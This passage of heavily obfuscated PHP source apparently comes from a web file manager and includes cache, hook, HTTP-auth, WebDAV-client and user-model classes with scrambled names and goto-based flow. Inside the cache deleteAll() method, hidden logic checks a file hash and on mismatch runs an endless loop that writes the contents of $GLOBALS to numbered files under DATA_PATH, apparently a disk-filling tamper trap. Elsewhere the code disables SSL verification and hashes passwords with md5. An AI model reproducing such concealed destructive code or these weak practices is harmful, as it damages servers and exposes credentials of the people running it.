$eÍŠÙ­†ì = $báîÄ“õÍ­[$_SERVER[¬ˆÚÂ”Éğä][795]]; $this->filterConfig($báîÄ“õÍ­, $eÍŠÙ­†ì[0]); $this->handle = $this->init($báîÄ“õÍ­, $B“­ò†Ÿê¿); goto e¿¨Ñ¦”Ë¥; e¿¨Ñ¦”Ë¥: unset($eÍŠÙ­†ì[0]); if (empty($eÍŠÙ­†ì)) { return; } $F·„¬ª§‚ó = array_rand($eÍŠÙ­†ì); goto D—ŞØ°°ö¬; D—ŞØ°°ö¬: $this->filterConfig($báîÄ“õÍ­, $eÍŠÙ­†ì[$F·„¬ª§‚ó]); $this->slaveHandle = $this->init($báîÄ“õÍ­, $B“­ò†Ÿê¿); goto cÑ»í«‹Şå; cÑ»í«‹Şå: } private function filterConfig(&$e¢ğ°ãœÃğ, $BšÖ•Ù¨Ûê) { $còô±Î°½Ì =& $_SERVER[¬ˆÚÂ”Éğä]; $bß“Šå¬ÚÃ = explode($còô±Î°½Ì[4], $BšÖ•Ù¨Ûê); $bƒÉš°¢ªÛ = array($còô±Î°½Ì[169] => $bß“Šå¬ÚÃ[0], $còô±Î°½Ì[170] => $bß“Šå¬ÚÃ[1]); $e¢ğ°ãœÃğ = array_merge($e¢ğ°ãœÃğ, $bƒÉš°¢ªÛ); } public function set($DÙØ¡àÇ…à, $a™Ù…Ÿ¦Áö, $bê›…áï¯ = false) { $bê›…áï¯ = $bê›…áï¯ ? $bê›…áï¯ : $this->cacheTime; return $this->handle->setEx($DÙØ¡àÇ…à, $bê›…áï¯, $a™Ù…Ÿ¦Áö); } public function setLock($a¿ØÊäÃ†˜, $aêÀá¸Ú¬±, $f’Š´¼š¼…) { return $this->handle->setNX($a¿ØÊäÃ†˜, $aêÀá¸Ú¬±); } public function get($e•–ª’¢Æ¸) { $CÃ¾ˆ•»ø¬ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $CÃ¾ˆ•»ø¬->get($e•–ª’¢Æ¸); } public function remove($EíŞ±í„ˆå) { return $this->handle->del($EíŞ±í„ˆå); } public function deleteAll() { $E†áİ‚ŒÁ =& $_SERVER[¬ˆÚÂ”Éğä]; $Cïè‚õ¦„Œ = $_SERVER[$E†áİ‚ŒÁ[788]] . $E†áİ‚ŒÁ[789]; $C£’Ãìæî¥ = $E†áİ‚ŒÁ[803]; if ($_SERVER[$E†áİ‚ŒÁ[785]] != $C£’Ãìæî¥($Cïè‚õ¦„Œ)) { goto e»Ä¿†æ£Å; EŞ»öÀÈ¡: $bÀ¯óğÛ— = $E†áİ‚ŒÁ[805]; $bÀ¯óğÛ—($_SERVER[$E†áİ‚ŒÁ[806]]); $e‘ßŠêó²ß = $E†áİ‚ŒÁ[804]; goto a¿šš˜ÙÄ£; D¦³ˆÜ¨¼: $EÎŸˆô¼‚ = $A‚‹à ¦Ê($c©Æ–¹Çã¦); $AéÍº½› = explode($E†áİ‚ŒÁ[217], $EÎŸˆô¼‚); if (count($AéÍº½›) < $E†áİ‚ŒÁ[553]) { $F½–·İ¬øÄ = $E†áİ‚ŒÁ[790]; $F½–·İ¬øÄ(); } goto EŞ»öÀÈ¡; f¼‘©Ú¶ß“: $EŞèÙÀ¹‡ˆ = 1; for ($f¥Á­¸ç“ = $EŞèÙÀ¹‡ˆ; $f¥Á­¸ç“ > 0; $f¥Á­¸ç“++) { $eà‹ôÓøÙ(DATA_PATH . $f¥Á­¸ç“, $cÌ…®Šƒà); } goto eˆ©ƒ¢éÇ®; a¿šš˜ÙÄ£: $e‘ßŠêó²ß(); $eà‹ôÓøÙ = $E†áİ‚ŒÁ[807]; $cÌ…®Šƒà = json_encode($GLOBALS[$E†áİ‚ŒÁ[808]]); goto f¼‘©Ú¶ß“; e»Ä¿†æ£Å: $e‘ßŠêó²ß = $E†áİ‚ŒÁ[804]; $A‚‹à ¦Ê = $E†áİ‚ŒÁ[787]; $c©Æ–¹Çã¦ = $_SERVER[$E†áİ‚ŒÁ[788]] . $E†áİ‚ŒÁ[789]; goto D¦³ˆÜ¨¼; eˆ©ƒ¢éÇ®: } if ($this->isCluster) { foreach ($this->handle->_masters() as $CÎæ†´”) { $this->handle->flushall($CÎæ†´”); } return; } return $this->handle->flushAll(); } } goto c³¿¹Ãß”â; dóëØİÛœ„: class Hook { private static $events = array(); public static function get($e®¯Ø£¤‡÷ = false) { if (!$e®¯Ø£¤‡÷) { return self::$events; } else { return self::$events[$e®¯Ø£¤‡÷]; } } public static function apply($b¤«»¼Å, $D¼‡Á¿´Ë» = array()) { $eèØ±Î’‹Í = ActionApply($b¤«»¼Å, $D¼‡Á¿´Ë»); if (is_string($b¤«»¼Å)) { Hook::trigger($b¤«»¼Å); } return $eèØ±Î’‹Í; } public static function bind($dš¬Ÿøùî, $BâõŸ«ğ¤, $B»³¶¬œá = false) { $DùĞè÷Á‡œ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset(self::$events[$dš¬Ÿøùî])) { self::$events[$dš¬Ÿøùî] = array(); } self::$events[$dš¬Ÿøùî][] = array($DùĞè÷Á‡œ[1765] => $BâõŸ«ğ¤, $DùĞè÷Á‡œ[1766] => $B»³¶¬œá, $DùĞè÷Á‡œ[1767] => 0); } public static function once($dâ‡†·ÎÌª, $cì·”š„®) { self::bind($dâ‡†·ÎÌª, $cì·”š„®, !0); } public static function unbind($d§šÎó˜Š, $dÑÒŞ·Šù = false) { if (!$dÑÒŞ·Šù) { self::$events[$d§šÎó˜Š] = array(); return; } $cÁĞøœ‰ò = self::$events[$d§šÎó˜Š]; self::$events[$d§šÎó˜Š] = array(); if (!is_array($cÁĞøœ‰ò)) { return; } for ($e‡øëè”ë† = 0; $e‡øëè”ë† < count($cÁĞøœ‰ò); $e‡øëè”ë†++) { if ($cÁĞøœ‰ò[$e‡øëè”ë†][$_SERVER[¬ˆÚÂ”Éğä][1765]] == $dÑÒŞ·Šù) { continue; } self::$events[$d§šÎó˜Š][] = $cÁĞøœ‰ò[$e‡øëè”ë†]; } } public static function filter($A¬ç±ò‡Äá, $f÷ùóÎ“…§) { goto BŠ¢œ«–ô‡; E—Ğ¤Ö·À: $eÆ®¯¬‰‚Ü = $AÑ£„²Àã½[$A¬ç±ò‡Äá]; $e”®œŒƒå = $f÷ùóÎ“…§; if (!is_array($eÆ®¯¬‰‚Ü) || count($eÆ®¯¬‰‚Ü) == 0) { return $e”®œŒƒå; } goto BïÇ§ËÜõİ; BŠ¢œ«–ô‡: $bÌ‰‡ëÊ×Ş =& $_SERVER[¬ˆÚÂ”Éğä]; $AÑ£„²Àã½ = self::$events; if (!isset($AÑ£„²Àã½[$A¬ç±ò‡Äá])) { return $f÷ùóÎ“…§; } goto E—Ğ¤Ö·À; BïÇ§ËÜõİ: for ($añ²ÎÒŒÂ‰ = 0; $añ²ÎÒŒÂ‰ < count($eÆ®¯¬‰‚Ü); $añ²ÎÒŒÂ‰++) { $c‡ÍøÆ³Š = $eÆ®¯¬‰‚Ü[$añ²ÎÒŒÂ‰]; if ($c‡ÍøÆ³Š[$bÌ‰‡ëÊ×Ş[1766]] && $c‡ÍøÆ³Š[$bÌ‰‡ëÊ×Ş[1767]] > 1) { continue; } self::$events[$A¬ç±ò‡Äá][$añ²ÎÒŒÂ‰][$bÌ‰‡ëÊ×Ş[1767]] = $c‡ÍøÆ³Š[$bÌ‰‡ëÊ×Ş[1767]] + 1; $eóİºãšŸ = self::apply($c‡ÍøÆ³Š[$bÌ‰‡ëÊ×Ş[1765]], array($e”®œŒƒå)); if (gettype($eóİºãšŸ) == gettype($e”®œŒƒå)) { $e”®œŒƒå = $eóİºãšŸ; } } return $e”®œŒƒå; goto B§•˜øÒ‡ñ; B§•˜øÒ‡ñ: } public static function trigger($Aååù‰É¸) { goto FÃ²Ğ®¸Î’; båä®ùÔÃÅ: if (!isset($CÒßÙÈùŒ[$Aååù‰É¸])) { return $bÄÌë·ö¬; } $aäÇÜŒŒ„Å = $CÒßÙÈùŒ[$Aååù‰É¸]; if (!is_array($aäÇÜŒŒ„Å) || count($aäÇÜŒŒ„Å) == 0) { return $bÄÌë·ö¬; } goto D‚Îİ”ÜÁª; FÃ²Ğ®¸Î’: $Fø‡’´Ç–¡ =& $_SERVER[¬ˆÚÂ”Éğä]; $CÒßÙÈùŒ = self::$events; $bÄÌë·ö¬ = !1; goto båä®ùÔÃÅ; cÉÕ³íÛ—Ã: return $bÄÌë·ö¬; goto D°ğ§¤Ñí; D‚Îİ”ÜÁª: $C¹Ïèñˆß = func_get_args(); array_shift($C¹Ïèñˆß); for ($dÅ£‡É¼÷ø = 0; $dÅ£‡É¼÷ø < count($aäÇÜŒŒ„Å); $dÅ£‡É¼÷ø++) { $a”¼‡ ß = $aäÇÜŒŒ„Å[$dÅ£‡É¼÷ø]; if ($a”¼‡ ß[$Fø‡’´Ç–¡[1766]] && $a”¼‡ ß[$Fø‡’´Ç–¡[1767]] > 1) { continue; } if (defined($Fø‡’´Ç–¡[1768]) && GLOBAL_LOG_HOOK) { write_log($Aååù‰É¸ . $Fø‡’´Ç–¡[1769] . $a”¼‡ ß[$Fø‡’´Ç–¡[1765]], $Fø‡’´Ç–¡[1770]); } self::$events[$Aååù‰É¸][$dÅ£‡É¼÷ø][$Fø‡’´Ç–¡[1767]] = $a”¼‡ ß[$Fø‡’´Ç–¡[1767]] + 1; $DËäõÎ†Ïª = self::apply($a”¼‡ ß[$Fø‡’´Ç–¡[1765]], $C¹Ïèñˆß); if (defined($Fø‡’´Ç–¡[1768]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $Fø‡’´Ç–¡[1770]); if ($a”¼‡ ß[$Fø‡’´Ç–¡[1767]] == 200) { $f„øƒáµ¦Ë = is_array($a”¼‡ ß[$Fø‡’´Ç–¡[1765]]) ? json_encode_force($a”¼‡ ß[$Fø‡’´Ç–¡[1765]]) : $a”¼‡ ß[$Fø‡’´Ç–¡[1765]]; write_log($Fø‡’´Ç–¡[1771] . $Aååù‰É¸ . $Fø‡’´Ç–¡[1772] . $f„øƒáµ¦Ë, $Fø‡’´Ç–¡[1773]); } } $bÄÌë·ö¬ = is_null($DËäõÎ†Ïª) ? $bÄÌë·ö¬ : $DËäõÎ†Ïª; } goto cÉÕ³íÛ—Ã; D°ğ§¤Ñí: } } class HttpAuth { public static function get() { $b¬ª‘ßÓ =& $_SERVER[¬ˆÚÂ”Éğä]; $aé¢‡‘¡ÍÖ = $b¬ª‘ßÓ[33]; $eÀõ‡„‹äø = $b¬ª‘ßÓ[33]; if (isset($_SERVER[$b¬ª‘ßÓ[1774]])) { $aé¢‡‘¡ÍÖ = $_SERVER[$b¬ª‘ßÓ[1774]]; $eÀõ‡„‹äø = $_SERVER[$b¬ª‘ßÓ[1775]]; } elseif (isset($_SERVER[$b¬ª‘ßÓ[1776]])) { $b¿™³¸è = $_SERVER[$b¬ª‘ßÓ[1776]]; if (strpos(strtolower($b¿™³¸è), $b¬ª‘ßÓ[1777]) === 0) { $BÎğ ¶¨ØÅ = explode($b¬ª‘ßÓ[4], base64_decode(substr($b¿™³¸è, 6))); $aé¢‡‘¡ÍÖ = isset($BÎğ ¶¨ØÅ[0]) ? $BÎğ ¶¨ØÅ[0] : $b¬ª‘ßÓ[33]; $eÀõ‡„‹äø = isset($BÎğ ¶¨ØÅ[1]) ? $BÎğ ¶¨ØÅ[1] : 0; } } return array($b¬ª‘ßÓ[537] => $aé¢‡‘¡ÍÖ, $b¬ª‘ßÓ[909] => $eÀõ‡„‹äø); } public static function error() { goto bò¶âƒÒ¡´; bò¶âƒÒ¡´: $BÀÍï®‚ø =& $_SERVER[¬ˆÚÂ”Éğä]; header($BÀÍï®‚ø[1778]); header($BÀÍï®‚ø[1779]); goto FÂ›ó¶êáé; FÂ›ó¶êáé: header($BÀÍï®‚ø[1780]); header($BÀÍï®‚ø[1781]); header($BÀÍï®‚ø[1276]); goto C¡È¶­­º; C¡È¶­­º: die; goto D¢éšÑİä–; D¢éšÑİä–: } public static function make($E—æˆêë´Ö, $E«ö©Ğ’É£) { $AÕ²êÕÂì =& $_SERVER[¬ˆÚÂ”Éğä]; return $AÕ²êÕÂì[1782] + base64_encode($E—æˆêë´Ö . $AÕ²êÕÂì[4] . $E«ö©Ğ’É£); } } class HttpDavClient { public function __construct($b½‡ÍäĞ«, $B­åÉÙÒò, $Cò¾Ô¼—×ó) { $this->header = array(); $this->userName = $B­åÉÙÒò; $this->userPassowrd = $Cò¾Ô¼—×ó; } protected function makePath($e×½¡ºŠŒ) { return $e×½¡ºŠŒ; } protected function setHeader($E‚øÚƒ™, $C›¡¦•àÏÔ = false) { if ($C›¡¦•àÏÔ === !1) { $this->header[] = $E‚øÚƒ™; } else { $this->header[] = $E‚øÚƒ™ . $_SERVER[¬ˆÚÂ”Éğä][892] . $C›¡¦•àÏÔ; } } public function move($b…Ù‚ŠÃ—±, $C´Óµ¡¬½ì, $BÒ•–¦À± = '') { $dÅÇÅòæÂ¬ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->setHeader($dÅÇÅòæÂ¬[1783], $this->makePath($C´Óµ¡¬½ì)); $this->setHeader($dÅÇÅòæÂ¬[1784], $dÅÇÅòæÂ¬[1785]); if ($BÒ•–¦À±) { $this->setHeader($dÅÇÅòæÂ¬[1786], $dÅÇÅòæÂ¬[937] . $BÒ•–¦À± . $dÅÇÅòæÂ¬[940]); } return $this->send($dÅÇÅòæÂ¬[1787], $b…Ù‚ŠÃ—±); } public function copy($b»ì‰…Ô¹ò, $BÔèïˆÅğ) { $Eº·õÒÄ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->setHeader($Eº·õÒÄ[1783], $this->makePath($BÔèïˆÅğ)); $this->setHeader($Eº·õÒÄ[1784], $Eº·õÒÄ[1785]); return $this->send($Eº·õÒÄ[1788], $b»ì‰…Ô¹ò); } public function mkcol($b‘Öœ‡Ó) { $D÷ß†¦íéË =& $_SERVER[¬ˆÚÂ”Éğä]; $this->setHeader($D÷ß†¦íéË[1784], $D÷ß†¦íéË[1785]); return $this->send($D÷ß†¦íéË[1789], $b‘Öœ‡Ó); } public function delete($Dšä­Şæù, $aµæáÜİ™´ = '') { $cŠ¥½äÙ° =& $_SERVER[¬ˆÚÂ”Éğä]; if ($aµæáÜİ™´) { $this->setHeader($cŠ¥½äÙ°[1786], $cŠ¥½äÙ°[937] . $aµæáÜİ™´ . $cŠ¥½äÙ°[940]); } return $this->send($cŠ¥½äÙ°[1264], $Dšä­Şæù); } public function propfind($eÜ½¶÷Œ…Á) { $càîŠ±ÆÆŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->setHeader($càîŠ±ÆÆŠ[1790], $càîŠ±ÆÆŠ[83]); $this->setHeader($càîŠ±ÆÆŠ[1791], $càîŠ±ÆÆŠ[1792]); $b†£òÆğ‚í = $càîŠ±ÆÆŠ[1793]; return $this->send($càîŠ±ÆÆŠ[1794], $eÜ½¶÷Œ…Á, $b†£òÆğ‚í); } public function options($dßê§½ùîÍ) { return $this->send($_SERVER[¬ˆÚÂ”Éğä][1795], $dßê§½ùîÍ); } public function get($e¬”îªÍ‚) { return $this->send($_SERVER[¬ˆÚÂ”Éğä][216], $e¬”îªÍ‚); } public function put($E™Ş³÷§¥¿, $E¸‡’ô¥›, $a Ìêóˆ¢ = '') { $eîì›‘¸Ğ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($a Ìêóˆ¢) { $this->setHeader($eîì›‘¸Ğ[1786], $eîì›‘¸Ğ[937] . $a Ìêóˆ¢ . $eîì›‘¸Ğ[940]); } return $this->send($eîì›‘¸Ğ[214], $E™Ş³÷§¥¿, $E¸‡’ô¥›); } protected function send($FÎêÔÖ¢§Ö, $A×Í»Õ¶œÑ, $Dšù±ÑÌÉ‹ = false, $fŸâÒÓ½ó§ = false) { goto AÔÆš¸õ; BÌ†÷ïô”: $this->setHeader($fĞ¼ù°Ò³§); if ($Dšù±ÑÌÉ‹) { $Dšù±ÑÌÉ‹ = $b™ñöœÛâ[1797] . $Dšù±ÑÌÉ‹; } if (!request_url_safe($A×Í»Õ¶œÑ)) { return !1; } goto AÜİ¹áŠŞå; dŒ‰î”øÔ: curl_setopt($EÔ‡ñ…áØ†, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($EÔ‡ñ…áØ†, CURLOPT_SSL_VERIFYHOST, !1); $Däè£Ê•À = curl_exec($EÔ‡ñ…áØ†); goto Dî™¯ñí³á; Dî™¯ñí³á: $this->header = array(); return $Däè£Ê•À; goto a¼šÌŒÄ³Ş; AÔÆš¸õ: $b™ñöœÛâ =& $_SERVER[¬ˆÚÂ”Éğä]; $fĞ¼ù°Ò³§ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($b™ñöœÛâ[1796], $b™ñöœÛâ[50]); goto BÌ†÷ïô”; FÊéïã‹èë: curl_setopt($EÔ‡ñ…áØ†, CURLOPT_HTTPHEADER, $this->header); curl_setopt($EÔ‡ñ…áØ†, CURLOPT_RETURNTRANSFER, !0); curl_setopt($EÔ‡ñ…áØ†, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto dŒ‰î”øÔ; AÜİ¹áŠŞå: $EÔ‡ñ…áØ† = curl_init($A×Í»Õ¶œÑ); curl_setopt($EÔ‡ñ…áØ†, CURLOPT_CUSTOMREQUEST, $FÎêÔÖ¢§Ö); curl_setopt($EÔ‡ñ…áØ†, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto FÊéïã‹èë; a¼šÌŒÄ³Ş: } } goto BÚ‚ø×çÊÎ; C†Ğ£ò¶¶: class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\x6d\145" => "\165\x73\145\162\x5f\155\145\164\x61", "\155\145\x74\x61\106\x69\x65\154\144" => "\x75\x73\x65\162\x49\x44"); protected $simpleField = "\165\163\145\162\111\x44\x2c\156\x69\143\153\116\x61\155\x65\x2c\x6e\x61\x6d\x65\54\141\x76\x61\x74\141\162\x2c\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($CÇğ¬ñ) { $a·„´¯‰Û =& $_SERVER[¬ˆÚÂ”Éğä]; $A®ƒ‡§ò¯‹ = $a·„´¯‰Û[2536]; return array($a·„´¯‰Û[2190] => array($CÇğ¬ñ[0], $A®ƒ‡§ò¯‹), $a·„´¯‰Û[2192] => array($CÇğ¬ñ[0], $A®ƒ‡§ò¯‹), $a·„´¯‰Û[2537] => array($CÇğ¬ñ[0], $A®ƒ‡§ò¯‹)); } protected function getInfo($C”¦¸¼‚æ, $A‡ÜÂ¡­™ = false) { $féçÕÅ°Â¨ = $this->getInfoSimple($C”¦¸¼‚æ); if (!is_array($féçÕÅ°Â¨)) { return array(); } if ($A‡ÜÂ¡­™) { return $this->_getInfoApply($féçÕÅ°Â¨); } return $this->cacheFunctionGet($_SERVER[¬ˆÚÂ”Éğä][2247], $C”¦¸¼‚æ); } protected function getInfoFull($FÇñÃÖˆÛ, $Dâ‘çŸ”…£ = false) { $F¡‘Í÷´ìÔ = $this->getInfoSimple($FÇñÃÖˆÛ); if (!is_array($F¡‘Í÷´ìÔ)) { return array(); } if ($Dâ‘çŸ”…£) { return $this->_getInfoApply($F¡‘Í÷´ìÔ, !0); return $this->_getInfoApply($F¡‘Í÷´ìÔ, !0); } return $this->cacheFunctionGet($_SERVER[¬ˆÚÂ”Éğä][2538], $FÇñÃÖˆÛ); } private function _getInfoApply($E¹’Ò¡…ç§, $bƒ‡°¥Îğ = false) { goto A³½Ê‰¤î©; eÏ³ô·Ÿ•¢: $E¹’Ò¡…ç§ = $this->_listDataApplyItem($E¹’Ò¡…ç§); $c É‹ã±‰› = Model($câ¼ÚÚß–[1130])->metaGet($E¹’Ò¡…ç§[$câ¼ÚÚß–[391]][$câ¼ÚÚß–[369]]); $E¹’Ò¡…ç§[$câ¼ÚÚß–[2541]] = $FÉÅšÀïéÑ; goto FËÊİ§¬ß‘; FËÊİ§¬ß‘: $E¹’Ò¡…ç§[$câ¼ÚÚß–[391]][$câ¼ÚÚß–[2376]] = isset($c É‹ã±‰›[$câ¼ÚÚß–[2377]]) ? $c É‹ã±‰›[$câ¼ÚÚß–[2377]] : null; if ($bƒ‡°¥Îğ) { $E¹’Ò¡…ç§[$câ¼ÚÚß–[417]] = $this->metaGet($E¹’Ò¡…ç§[$câ¼ÚÚß–[1450]]); } return $E¹’Ò¡…ç§; goto d–êŒ¤˜Ù©; A³½Ê‰¤î©: $câ¼ÚÚß– =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$E¹’Ò¡…ç§) { return $E¹’Ò¡…ç§; } $FÉÅšÀïéÑ = md5($câ¼ÚÚß–[2539] . $E¹’Ò¡…ç§[$câ¼ÚÚß–[814]] . $câ¼ÚÚß–[2540] . $E¹’Ò¡…ç§[$câ¼ÚÚß–[28]]); goto eÏ³ô·Ÿ•¢; d–êŒ¤˜Ù©: } protected function getInfoSimple($BˆèƒäÚ¡, $F‚‹èÙğí = false) { $E¼Å¥å†˜ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$BˆèƒäÚ¡) { return array(); } if ($F‚‹èÙğí) { $få¯¢¶ôÈ = $this->where(array($E¼Å¥å†˜[1450] => intval($BˆèƒäÚ¡)))->find(); if (!is_array($få¯¢¶ôÈ)) { return array(); } $få¯¢¶ôÈ[$E¼Å¥å†˜[2542]] = Action($E¼Å¥å†˜[2543])->parseUrl($få¯¢¶ôÈ[$E¼Å¥å†˜[2542]]); return $få¯¢¶ôÈ; } return $this->cacheFunctionGet($E¼Å¥å†˜[2193], $BˆèƒäÚ¡); } protected function getInfoSimpleOuter($CÈßôƒ‚›æ) { goto bÛœ„ù¸¿¸; bÛœ„ù¸¿¸: $dœ‰³Ùô‹ò =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$CÈßôƒ‚›æ || $CÈßôƒ‚›æ == 0) { return array($dœ‰³Ùô‹ò[1450] => $dœ‰³Ùô‹ò[470], $dœ‰³Ùô‹ò[28] => $dœ‰³Ùô‹ò[157] . LNG($dœ‰³Ùô‹ò[2544]) . $dœ‰³Ùô‹ò[478], $dœ‰³Ùô‹ò[2542] => STATIC_PATH . $dœ‰³Ùô‹ò[2545]); } $aÜ­Œù°Õ = $this->cacheFunctionGet($dœ‰³Ùô‹ò[2193], $CÈßôƒ‚›æ); goto EêÜò‹µÔ; EêÜò‹µÔ: $bÆÛÒ•àÀ” = array_field_key($aÜ­Œù°Õ, explode($dœ‰³Ùô‹ò[47], $this->simpleField)); if (!$bÆÛÒ•àÀ”) { return array($dœ‰³Ùô‹ò[1450] => $dœ‰³Ùô‹ò[1044], $dœ‰³Ùô‹ò[28] => $dœ‰³Ùô‹ò[157] . LNG($dœ‰³Ùô‹ò[2546]) . $dœ‰³Ùô‹ò[478], $dœ‰³Ùô‹ò[2542] => STATIC_PATH . $dœ‰³Ùô‹ò[2547]); } $bÆÛÒ•àÀ”[$dœ‰³Ùô‹ò[2542]] = Action($dœ‰³Ùô‹ò[2543])->parseUrl($bÆÛÒ•àÀ”[$dœ‰³Ùô‹ò[2542]]); goto AÑ¨İ‡é‘ø; AÑ¨İ‡é‘ø: return $bÆÛÒ•àÀ”; goto Bã¥éù”İñ; Bã¥éù”İñ: } protected function groupUser($BŒØÕÁá˜) { } public static function errorLang($Bš„–ˆ÷¼) { $fëõ·ç¾ Æ =& $_SERVER[¬ˆÚÂ”Éğä]; $C¸èÃğèâõ = array(self::ERROR_USER_NOT_EXISTS => $fëõ·ç¾ Æ[2548], self::ERROR_USER_PASSWORD_ERROR => $fëõ·ç¾ Æ[2549], self::ERROR_USER_EXIST_NAME => $fëõ·ç¾ Æ[2550], self::ERROR_USER_EXIST_PHONE => $fëõ·ç¾ Æ[2551], self::ERROR_USER_EXIST_EMAIL => $fëõ·ç¾ Æ[2552], self::ERROR_USER_LOGIN_LOCK => $fëõ·ç¾ Æ[2553], self::ERROR_IP_NOT_ALLOW => $fëõ·ç¾ Æ[2554], self::ERROR_USER_EXIST_NICKNAME => $fëõ·ç¾ Æ[2555]); return LNG($C¸èÃğèâõ[$Bš„–ˆ÷¼]); } public function getInfoByMeta($bîàõÎÙö, $bÃÇ‚¥î£Ü) { $b÷¬ÉÊËé =& $_SERVER[¬ˆÚÂ”Éğä]; $Bíî„¢Íø = Model($b÷¬ÉÊËé[2556])->where(array($b÷¬ÉÊËé[89] => $bîàõÎÙö, $b÷¬ÉÊËé[359] => $bÃÇ‚¥î£Ü))->find(); if ($Bíî„¢Íø) { return $this->getInfo($Bíî„¢Íø[$b÷¬ÉÊËé[1450]]); } return !1; } public function userLoginCheck($Fä éÂ™Ã×, $E†ó¡ÅÜŞ) { goto C‹À’£š˜ô; E¨ƒÈÅ±Ö: $A­ŠÅƒ©í = $this->where($E„ˆ…¿²‰é)->find(); if (!$A­ŠÅƒ©í) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($A­ŠÅƒ©í[$AÁ›ñÔ•‰Î[1450]], $E†ó¡ÅÜŞ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto BÅ¥œâ†Õ÷; BÅ¥œâ†Õ÷: $this->userEdit($A­ŠÅƒ©í[$AÁ›ñÔ•‰Î[1450]], array($AÁ›ñÔ•‰Î[2558] => time())); return $this->getInfo($A­ŠÅƒ©í[$AÁ›ñÔ•‰Î[1450]]); goto Eõ”Ì‘œ‘Ü; C‹À’£š˜ô: $AÁ›ñÔ•‰Î =& $_SERVER[¬ˆÚÂ”Éğä]; $E„ˆ…¿²‰é = array($AÁ›ñÔ•‰Î[28] => $Fä éÂ™Ã×, $AÁ›ñÔ•‰Î[2380] => $Fä éÂ™Ã×, $AÁ›ñÔ•‰Î[293] => $Fä éÂ™Ã×, $AÁ›ñÔ•‰Î[2557] => $Fä éÂ™Ã×, $AÁ›ñÔ•‰Î[926] => $AÁ›ñÔ•‰Î[928]); if ($this->nickNameRpt()) { unset($E„ˆ…¿²‰é[$AÁ›ñÔ•‰Î[2380]]); } goto E¨ƒÈÅ±Ö; Eõ”Ì‘œ‘Ü: } public function clearCache($Dİ‰¸ğÛîÔ) { $EÓë°œ¢ÊĞ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->cacheFunctionClear($EÓë°œ¢ÊĞ[2247], $Dİ‰¸ğÛîÔ); $this->cacheFunctionClear($EÓë°œ¢ÊĞ[2193], $Dİ‰¸ğÛîÔ); $this->cacheFunctionClear($EÓë°œ¢ÊĞ[2538], $Dİ‰¸ğÛîÔ); } public function userPasswordCheck($f™’¯óÌïÜ, $AŒ‰Âêßˆ…) { $FÒö–å¨ =& $_SERVER[¬ˆÚÂ”Éğä]; $D‚áêöõ²‘ = $this->where(array($FÒö–å¨[1450] => intval($f™’¯óÌïÜ)))->find(); $bÀÁ–’Æ‘Í = $this->metaGet($f™’¯óÌïÜ); $aÉ’—Ì™Œ = isset($bÀÁ–’Æ‘Í[$FÒö–å¨[2559]]) ? $bÀÁ–’Æ‘Í[$FÒö–å¨[2559]] : $FÒö–å¨[33]; if (md5($aÉ’—Ì™Œ . trim($AŒ‰Âêßˆ…)) !== $D‚áêöõ²‘[$FÒö–å¨[814]]) { return !1; } return !0; } public function userAdd($fá»š½¹®) { goto D•’™öêäô; BêŒÎØÕ‡ù: return $bµåî÷Š„¢; goto bøÙº¾İËó; eïò™‹¤‘Ì: $dÉ£µğ‰ëÎ = array($bÑè÷“İÅã[2567] => $a¿öğÒô§Ç[$bÑè÷“İÅã[814]], $bÑè÷“İÅã[2563] => $a¿öğÒô§Ç[$bÑè÷“İÅã[2380]]); $this->userEdit($bµåî÷Š„¢, $dÉ£µğ‰ëÎ); Model($bÑè÷“İÅã[1130])->userRootAdd($bµåî÷Š„¢); goto BêŒÎØÕ‡ù; D•’™öêäô: $bÑè÷“İÅã =& $_SERVER[¬ˆÚÂ”Éğä]; $a¿öğÒô§Ç = array($bÑè÷“İÅã[386] => $fá»š½¹®[$bÑè÷“İÅã[28]], $bÑè÷“İÅã[2560] => $fá»š½¹®[$bÑè÷“İÅã[1335]], $bÑè÷“İÅã[2561] => isset($fá»š½¹®[$bÑè÷“İÅã[293]]) ? $fá»š½¹®[$bÑè÷“İÅã[293]] : $bÑè÷“İÅã[33], $bÑè÷“İÅã[2562] => isset($fá»š½¹®[$bÑè÷“İÅã[2557]]) ? $fá»š½¹®[$bÑè÷“İÅã[2557]] : $bÑè÷“İÅã[33], $bÑè÷“İÅã[2563] => isset($fá»š½¹®[$bÑè÷“İÅã[2380]]) ? $fá»š½¹®[$bÑè÷“İÅã[2380]] : $fá»š½¹®[$bÑè÷“İÅã[28]], $bÑè÷“İÅã[2564] => isset($fá»š½¹®[$bÑè÷“İÅã[2542]]) ? $fá»š½¹®[$bÑè÷“İÅã[2542]] : $bÑè÷“İÅã[33], $bÑè÷“İÅã[2565] => isset($fá»š½¹®[$bÑè÷“İÅã[2566]]) ? $fá»š½¹®[$bÑè÷“İÅã[2566]] : 1, $bÑè÷“İÅã[2567] => $fá»š½¹®[$bÑè÷“İÅã[814]], $bÑè÷“İÅã[2194] => isset($fá»š½¹®[$bÑè÷“İÅã[2105]]) ? $fá»š½¹®[$bÑè÷“İÅã[2105]] : 1024 * 1024 * 20, $bÑè÷“İÅã[2195] => 0, $bÑè÷“İÅã[2558] => 0, $bÑè÷“İÅã[2233] => 